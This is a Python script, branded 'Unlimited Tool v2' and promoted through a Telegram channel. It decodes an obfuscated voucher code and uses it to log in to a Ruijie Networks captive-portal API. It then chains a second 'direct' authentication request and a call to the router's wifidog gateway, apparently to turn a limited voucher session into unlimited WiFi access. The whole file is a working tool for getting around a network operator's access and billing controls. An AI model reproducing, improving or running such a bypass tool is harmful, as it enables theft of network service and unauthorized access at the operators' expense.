import re, requests, os, sys
import base64
import hashlib

# From encoder.py logic
SECRET_PASSWORD = "unlimitedyg22"

def show_banner():
    os.system('clear')
    print("\033[1;36m" + """
 ██╗  ██╗███████╗████████╗ █████╗ ██████╗ 
 ██║ ██╔╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
 █████╔╝ ███████╗   ██║   ███████║██████╔╝
 ██╔═██╗ ╚════██║   ██║   ██╔══██║██╔══██╗
 ██║  ██╗███████║   ██║   ██║  ██║██║  ██║
 ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
""")
    print("\033[1;33m" + "=" * 50)
    print("\033[1;32m  ✦  Unlimited Tool v2  ✦")
    print("\033[1;36m  👑  Owner: @K_star3")
    print("\033[1;33m" + "=" * 50)

def decode_voucher(encoded_hash: str) -> str:
    try:
        key = hashlib.sha256(SECRET_PASSWORD.encode('utf-8')).digest()
        key_len = len(key)
        
        cipher_bytes = base64.b64decode(encoded_hash)
        data_bytes = bytearray()
        for i, byte in enumerate(cipher_bytes):
            data_bytes.append(byte ^ key[i % key_len])
            
        return data_bytes.decode('utf-8')
    except Exception as e:
        print(f"\033[1;31mError decoding voucher: {e}")
        sys.exit(1)

def get_session_id(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie':'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    
    try:
        response = requests.get(session_url, headers=headers)
        session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response.url).group(1)
    except requests.exceptions.ConnectionError:
        print("\033[1;31mConnection error occurred. Please check your internet connection and try again.")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("\033[1;31mThe request timed out. Please check your internet connection and try again.")
        sys.exit(1)
    except AttributeError:
        print("\033[1;31mFailed to extract session ID from the URL. Please check the session URL and try again.")
        line()
        print("\033[1;33Response: {}".format(response.text))
        sys.exit(1)
    return session_id


def login_voucher(session_id, voucher):
    data = {
        "accessCode": voucher,
        "sessionId": session_id,
        "apiVersion": 2
    }
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": f'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        with requests.post(post_url, json=data, headers=headers) as response:
            response_text = response.text
            if "Authentication failed" in response_text or "expired" in response_text or "Expired" in response_text:
                print("\033[1;33mVoucher code incorrect or expired")
                sys.exit(1)
            else:
                # print(response_text)
                return re.search('token=(.*?)&', response_text).group(1)
                
    except AttributeError:
        print("\033[1;31mFailed to retrieve token. Please check the voucher code and session ID.")
        line()
        print("\033[1;33mResponse: {}".format(response_text))
        sys.exit(1)
    except requests.exceptions.ConnectionError:
        print("\033[1;31mConnection error occurred. Please check your internet connection and try again.")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("\033[1;31mThe request timed out. Please check your internet connection and try again.")
        sys.exit(1)

def OneClick(token):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=7182e9a18cd04a1eb47868d3f7b69b44',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    params = {
        'lang': 'en_US',
    }

    json_data = {
        'phoneNumber':'',
        'sessionId': token,
    }
    try:
        response = requests.post(
            'https://portal-as.ruijienetworks.com/api/auth/direct/',
            params=params,
            headers=headers,
            json=json_data,
        )
        response_text = response.text
        return re.search('token=(.*?)&', response_text).group(1)
    except AttributeError:
        return None
    except requests.exceptions.ConnectionError:
        print("\033[1;31mConnection error occurred. Please check your internet connection and try again.")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("\033[1;31mThe request timed out. Please check your internet connection and try again.")
        sys.exit(1)
    
def Auth_as_Unlimited(voucher, ip, session_url):
    for i in range(3):
        session_id = get_session_id(session_url)
        print("\033[1;32mFinal Inactive Session Id: ", session_id)
        line()
        token = login_voucher(session_id, voucher)
        if token:
            print("\033[1;00mFinal Active Session Id:\033[1;32m ", token)
            line()
            token = OneClick(token)
            if token:
                auth(ip=ip, token=token, final=True)
                print("\033[1;32mSuccessful to change into unlimited")
                break
            else:
                print("\033[1;31mAttempt {} failed".format(i))
                line()
        else:
            print("\033[1;31mFailed to Authenticate. Please check the voucher code and session ID.")
    
def auth(voucher=None, ip=None, token=None, session_url=None, final=False):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,my;q=0.8',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    params = {
        'token': token,
        'phoneNumber': '',
    }
    try:
        response = requests.get(f'http://{ip}:2060/wifidog/auth', params=params, headers=headers).url
        if "success" in response or 'www.baidu.com' in response or "www.ruijie.com/en-global" in response:
            print("\033[1;32mSuccessfully Authenticated")
            line()
            if not final:
                Auth_as_Unlimited(voucher, ip, session_url)
        else:
            print("\033[1;31mFailed to Authenticate: {}".format(response))
    except Exception as e:
        print(f"\033[1;31mAuth error: {e}")

def show_footer():
    line()
    print("\033[1;35m  📢  Tg  : https://t.me/King_Master_K")
    print("\033[1;36m  👑  Owner: @K_star3")
    print("\033[1;33m" + "=" * 50 + "\033[0m")

def current_wifi():
    show_banner()
    print("\033[1;36m--- Unlimited Tool v2 (Encoded Input) ---")
    encoded_voucher = input("\033[1;00mEnter Encoded Voucher Hash:\033[1;32m ").strip()
    
    if not encoded_voucher:
        print("\033[1;31mEncoded hash cannot be empty!")
        show_footer()
        return

    # Decode the voucher using encoder.py logic
    voucher = decode_voucher(encoded_voucher)
    print(f"\033[1;34m[DEBUG] Decoded Voucher: {voucher}")
    
    line()
    print("\033[1;33mThe Mac Address from Session URL must be the same as the Mac Address of the User Connected WiFi.")
    line()
    session_url = input("\033[1;00mEnter Session Url: \033[1;34m").strip()
    line()
    ip = input("\033[1;00mEnter Your WiFi Gateway: \033[1;34m").strip()
    line()
    
    if not session_url or not ip:
        print("\033[1;31mSession URL and IP are required.")
        show_footer()
        return

    session_id = get_session_id(session_url)
    token = login_voucher(session_id, voucher)
    
    if token:
        auth(voucher, ip, token, session_url)
    else:
        print("\033[1;31mFailed to retrieve initial token.")

    show_footer()

def line():
    try:
        cols = os.get_terminal_size()[0]
    except:
        cols = 50
    print(cols * "\033[1;00m-")

if __name__ == "__main__":
    current_wifi()
